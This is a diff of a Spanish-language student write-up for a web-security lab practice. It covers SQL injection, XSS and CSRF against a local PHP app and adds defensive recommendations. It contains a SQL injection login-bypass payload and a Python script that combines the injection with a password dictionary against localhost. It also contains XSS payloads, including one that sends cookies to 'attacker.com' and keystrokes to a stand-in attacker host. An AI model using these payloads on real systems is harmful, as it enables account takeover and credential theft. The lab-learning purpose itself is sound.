@@ -2,7 +2,33 @@
 
 ### **A) Dad un ejemplo de combinación de usuario y contraseña que provoque un error en la consulta SQL generada por este formulario. Apartir del mensaje de error obtenido, decid cuál es la consulta SQL que se ejecuta, cuál de los campos introducidos al formulario utiliza y cuál no.**
 
-    ![FALTA]()
+    **1. Ejemplo de combinación de usuario y contraseña que provoque un error en la consulta SQL generada:**
+    Un ejemplo sería introducir los siguientes valores en los campos del formulario:
+    - **Username:** `"`
+    - **Password:** (vacío o cualquier valor, ya que no se utiliza en la consulta SQL).
+
+    **2. Consulta SQL generada y error observado:**
+    La consulta que se genera al procesar estos valores sería:
+    ```sql
+    SELECT userId, password FROM users WHERE username = "" OR password="1234"-- -"
+    ```
+
+    #### **3. Campos utilizados y no utilizados en la consulta SQL:**
+    - **Campos utilizados:** Solo el campo `Username` se usa directamente en la consulta SQL.
+    - **Campos no utilizados:** El campo `Password` no se utiliza, ya que no forma parte de la consulta construida.
+
+    #### **4. Identificación de la vulnerabilidad:**
+    La vulnerabilidad presente es una **inyección SQL (SQL Injection)**. Esto ocurre porque los datos introducidos por el usuario se concatenan directamente en la consulta SQL sin una validación ni un saneamiento adecuado.
+
+    #### **Justificación del análisis:**
+    La vulnerabilidad se debe a que el campo password no se usa en la consulta SQL para verificar la validez de la contraseña, lo que hace que la base de datos devuelva datos innecesarios (como userId y password) sin autenticar adecuadamente al usuario. Además, el valor ingresado en username no está siendo adecuadamente validado o escapado, lo que permite que se ejecute código malicioso.
+
+    #### **Consulta generada detallada:**
+    La consulta final, tras la inyección, sería:
+    ```sql
+    SELECT userId, password FROM users WHERE username = "" OR password="1234"
+    ```
+    El comentario `--` ignora el resto de la consulta, dejando solo las condiciones manipuladas por el atacante.
 
 ### **B) Gracias a la SQL Injection del apartado anterior, sabemos que este formulario es vulnerable y conocemos el nombre de los campos de la tabla “users”. Para tratar de impersonar a un usuario, nos hemos descargado un diccionario que contiene algunas de las contraseñas más utilizadas (se listan a continuación):**
 ### **- password**
@@ -15,7 +41,40 @@
 
 ### **Dad un ataque que, utilizando este diccionario, nos permita impersonar un usuario de esta aplicación y acceder en nombre suyo. Tened en cuenta que no sabéis ni cuántos usuarios hay registrados en la aplicación, ni los nombres de estos.**
 
-    ![FALTA]()
+    Se ha realizado un pequeño script en python para hacer un ataque de fuerza bruta utilizando los usuarios de la table `users`, y las contraseñas dadas en el diccionario.
+
+    El script que se a utilizado es el siguiente:
+
+    ```python
+    import requests
+
+    # URL del formulario de inicio de sesión
+    url = 'http://localhost:8080/list_players.php'
+
+    # Lista de contraseñas comunes para probar
+    passwords = ['password', '123456', '12345678', '1234', 'qwerty', 'dragon']
+
+    # Lista de usuarios (no se usa directamente en este script optimizado)
+    usernames = ["pepito", "luis", "marcos", "lucas", "eduardo", "carlos", "ana", "lorena", "ignacio", "maria"]
+
+    # Iteramos sobre cada contraseña
+    for password in passwords:
+        # Creamos el payload con la inyección SQL
+        payload = {
+            'username': f'" OR password="{password}"-- -',  # Inyección SQL en el campo de usuario
+            'password': password  # Contraseña actual en el ciclo
+        }
+        
+        # Enviamos la solicitud POST al servidor
+        response = requests.post(url, data=payload)
+        
+        # Verificamos si el inicio de sesión fue exitoso
+        if 'Players list' in response.text:  # Ajustar según la respuesta real del servidor
+            print(f'Login successful: Password: {password}')
+            break  # Salimos del bucle si encontramos una contraseña válida
+    ```
+
+    El cual va probando contraseñas hastan que en la web aparezca `Players list`, que eso quiere decir que se ha logueado.
 
 ### **C) Si vais a `private/auth.php`, veréis que en la función `areUserAndPasswordValid`, se utiliza “SQLite3::escapeString()”, pero, aun así, el formulario es vulnerable a SQL Injections, explicad cuál es el error de programación de esta función y como lo podéis corregir.**
 
@@ -53,34 +112,72 @@
 
 ### **Esto os permite estudiar el código fuente de `add\_comment.php` y encontrar una vulnerabilidad para publicar mensajes en nombre de otros usuarios. ¿Cuál es esta vulnerabilidad, y cómo es el ataque que utilizáis para explotarla?**
 
-    ![FALTA]()
+    El archivo `add_comment.php` contiene una vulnerabilidad de inyección SQL. Aquí está el análisis detallado:
+
+    La vulnerabilidad principal se encuentra en la construcción de la consulta SQL:
+
+    ```php
+    $query = "INSERT INTO comments (playerId, userId, body) VALUES ('".$_GET['id']."', '".$_COOKIE['userId']."', '$body')";
+    ```
+
+    Aunque se utiliza `SQLite3::escapeString($body)` para el campo `body`, los valores de `$_GET['id']` y `$_COOKIE['userId']` se insertan directamente en la consulta sin ninguna sanitización o validación.
+
+    **Cómo explotar la vulnerabilidad**
+
+    Se podria manipular el parámetro `id` en la URL o el valor de la cookie `userId` para inyectar código SQL malicioso.   
 
 <br><br><br>
 
 # Parte 2 - XSS
 
-### **A) Para ver si hay un problema de XSS, crearemos un comentario que muestre un alert de Javascript siempre que alguien consulte el/los comentarios de aquel jugador (show_comments php). Dad un mensaje que genere un «alert»de Javascript al consultar el listado de mensajes.**
+### **A) Para ver si hay un problema de XSS, crearemos un comentario que muestre un alert de Javascript siempre que alguien consulte el/los comentarios de aquel jugador (show_comments php). Dad un mensaje que genere un «alert» de Javascript al consultar el listado de mensajes.**
 
-    **(Identifica y demuestra un ataque XSS funcional, explicando el impacto del alert.)**
+    Al introducir el mensaje `<script>alert('XSS detectado');</script>` en el formulario de la página show_comments.php, se demuestra una vulnerabilidad XSS. Esto ocurre porque la aplicación no valida ni escapa adecuadamente el contenido ingresado por el usuario, permitiendo que el navegador ejecute el código malicioso en lugar de mostrarlo como texto.
 
-    Introduzco el mensaje `<script>alert('XSS detectado');</script>`
+    **Impacto del `alert`**:
+    
+    Aunque el alert parece inofensivo, su propósito es probar que puedes ejecutar JavaScript en el contexto de otro usuario. Un atacante podría reemplazar este código con scripts mucho más dañinos, como:
 
-    En el formulario de la página `show_comments.php`
+    - **Robo de cookies de sesión**: Para hacerse pasar por el usuario.
+    - **Descarga de malware**: Engañando al usuario para instalar archivos maliciosos.
+    - **Phishing visual**: Cambiar el contenido de la página para recolectar credenciales.
+
+    **Impacto general de un XSS en una web**
+
+    Además del simple alert(), aquí hay un ejemplo más detallado de un ataque XSS malicioso:
+
+    ```js
+    <script>
+        // Robo de cookies
+        var stolenCookie = document.cookie;
+        new Image().src = "http://attacker.com/steal?cookie=" + encodeURIComponent(stolenCookie);
+
+        // Modificación del contenido de la página
+        document.body.innerHTML = '<h1>Sitio hackeado</h1><form>Usuario: <input type="text"><br>Contraseña: <input type="password"><br><input type="submit" value="Iniciar sesión"></form>';
+
+        // Keylogger
+        document.onkeypress = function(e) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "http://WebDelAtacante.com/log?key=" + e.key, true);
+            xhr.send();
+        };
+    </script>
+    ```
 
 ### **B) Por qué dice `&amp;` cuando miráis un link (como el que aparece a la portada de esta aplicación pidiendo que realices un donativo) con parámetros GET dentro de código html si en realidad el link es sólo con "&" ?**
 
     El símbolo `&` (ampersand) en un URL se utiliza en los parámetros de una consulta GET para separar las diferentes variables o parámetros. Por ejemplo:
 
     ```txt
-    https://example.com/donacion?cantidad=50&nombre=Juan
+    http://www.donate.co/?amount=100&destination=ACMEScouting/
     ```
 
-    En este caso, el `&` separa los parámetros `cantidad` y `nombre`.
+    En este caso, el `&` separa los parámetros `amount` y `destination`.
 
     Sin embargo, en HTML, el símbolo `&` tiene un significado especial porque es el inicio de una **entidad de caracteres**. Para representar este símbolo de manera literal en un documento HTML, se debe usar la entidad `&amp;`. Esto asegura que el navegador interprete correctamente el `&` como un carácter y no como el comienzo de una nueva entidad HTML. Así que en un código HTML, la URL con parámetros GET debería escribirse como:
 
     ```txt
-    https://example.com/donacion?cantidad=50&amp;nombre=Juan
+    http://www.donate.co/?amount=100&amp;destination=ACMEScouting/
     ```
 
     **Impacto en seguridad y usabilidad:**
@@ -127,11 +224,11 @@
 ### **D) Descubrid si hay alguna otra página que esté afectada por esta misma vulnerabilidad. En caso positivo, explicad cómo lo habéis descubierto.**
 
     **Otras páginas afectadas:**  
-    - **`insert_player.php`**: Afectada por XSS almacenado si los datos de entrada (como el nombre del jugador) no se validan y se muestran sin sanitización en otras páginas.
+    - **`insert_player.php`**: Afectada por XSS almacenado, ya que los datos de entrada (como el `Player name` o `Team name`) no se validan y se muestran sin sanitización en otras páginas.
     - **`buscador.php`**: Afectada por XSS reflejado si el término de búsqueda no se valida y permite la ejecución de código malicioso cuando se muestra en los resultados.
 
     **Cómo lo he descubierto:**  
-    He probado insertar un script malicioso (`<script>alert('XSS');</script>`) en los campos de entrada. Si el script se ejecuta al visualizar la página con los datos ingresados, la página es vulnerable a XSS.
+    Se ha probado insertar un script malicioso (`<script>alert('XSS');</script>`) en los campos de entrada. Si el script se ejecuta al visualizar la página con los datos ingresados, la página es vulnerable a XSS.
 
 <br><br><br>
 
@@ -300,7 +397,7 @@
 
     Crear un archivo error.php para redirigir a los usuarios no autorizados:
 
-    ```php
+    ```html
     <!DOCTYPE html>
     <html lang="es">
     <head>
@@ -325,8 +422,6 @@
     ```
 
 ### **D) Al comienzo de la práctica hemos supuesto que la carpeta `private` no tenemos acceso, pero realmente al configurar el sistema en nuestro equipo de forma local. ¿Se cumple esta condición? ¿Qué medidas podemos tomar para que esto no suceda?**
-
-    **(Analiza completamente la situación e implementa medidas efectivas para proteger la carpeta private.)**
 
     La condición de que la carpeta `private` no sea accesible no se cumple en un entorno local por defecto.
 
@@ -419,7 +514,30 @@
 
 ### **¿Qué medidas de seguridad se implementariaís en el servidor web para reducir el riesgo a ataques?**
 
-    ![FALTA]()
+    **Protección contra SQL Injection (SQLi) en SQLite3:**
+
+    1. **Usar sentencias preparadas**: SQLite3 soporta consultas preparadas a través de su API. Al utilizar consultas preparadas, los parámetros de entrada se envían como datos, no como parte de la consulta, evitando la inyección de código malicioso.
+
+    2. **Escapar las entradas del usuario**: Aunque el uso de sentencias preparadas es la opción preferida, en casos donde no puedas utilizarlas, asegúrate de escapar adecuadamente las entradas del usuario antes de incluirlas en las consultas. SQLite3 tiene funciones para hacer esto de manera segura.
+
+    3. **Evitar consultas dinámicas**: Similar a otras bases de datos, evita construir consultas SQL mediante concatenación directa de cadenas. Las consultas dinámicas que incluyen entradas del usuario son vulnerables a ataques de inyección SQL.
+
+    4. **Validar y filtrar entradas**: Antes de procesar las entradas del usuario, verifica que coincidan con el formato esperado. Por ejemplo, si un campo debe contener solo números, asegúrate de que no contenga caracteres no numéricos que podrían ser utilizados para ataques.
+
+
+    **Protección contra Cross-Site Scripting (XSS):**
+
+    1. **Escapar la salida**: Asegúrate de que cualquier dato del usuario que se muestre en la página web esté adecuadamente escapado. Esto incluye caracteres especiales como `<`, `>`, `&`, comillas, etc., para evitar que se ejecute código JavaScript malicioso.
+
+    2. **Implementar una Content Security Policy (CSP)**: Configura una política de seguridad de contenido que limite los orígenes de los recursos (como scripts, imágenes, etc.) que se pueden cargar en tu aplicación, evitando la ejecución de código malicioso.
+
+    3. **Validación de entradas**: Filtra y valida todas las entradas del usuario para asegurarte de que no contengan contenido HTML o JavaScript peligroso.
+
+    4. **Uso de cookies seguras**: Si tu aplicación utiliza cookies, marca las cookies como `HttpOnly` y `Secure` para evitar que los scripts maliciosos accedan a ellas y para asegurarte de que las cookies solo se envíen a través de conexiones seguras.
+
+    5. **Evitar la inserción de HTML sin procesar**: Si permites que los usuarios ingresen contenido HTML, asegúrate de limpiarlo adecuadamente para eliminar cualquier etiqueta o script malicioso. Esto se puede hacer usando librerías especializadas como HTMLPurifier.
+
+    Estas medidas ayudarán a proteger tu aplicación que usa **SQLite3** contra los riesgos más comunes de **SQLi** y **XSS**.
 
 <br><br><br>
 
@@ -435,7 +553,7 @@
         <button>Profile</button>
     </a>
 
-### **B) Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que elusuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (`show\_comments.php`).**
+### **B) Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que el usuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (`show\_comments.php`).**
 
     Añadimos un codigo malicios en los comentarios de los jugadores
 
